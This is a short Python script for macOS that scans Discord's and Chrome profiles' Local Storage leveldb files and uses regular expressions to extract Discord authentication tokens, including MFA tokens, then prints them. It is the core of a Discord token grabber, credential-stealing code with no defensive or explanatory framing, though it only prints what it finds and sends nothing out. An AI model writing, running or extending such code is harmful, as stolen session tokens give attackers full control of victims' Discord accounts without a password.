import os
import re


def findTokens():
    tokenList = []
    lib = f"/Users/{os.getlogin()}/Library/Application Support/"

    paths = {
    'Discord': lib + 'discord/Local Storage/leveldb',
    }
    for i in range(1, 100):
        path = lib + f"/Google/Chrome/Profile {i}/Local Storage/leveldb"
        if not os.path.exists(path):
            continue
        paths[f'Google Chrome Profile {i}'] = path

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        for token in extract_tokens(path):
            tokenList.append(token)

    return tokenList


def extract_tokens(path):
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


if __name__ == "__main__":
    tokens = findTokens()
    if len(tokens) == 0:
        print("No tokens found")
    else:
        print(f"Found {len(tokens)} tokens:")
        for token in tokens:
            print(token)
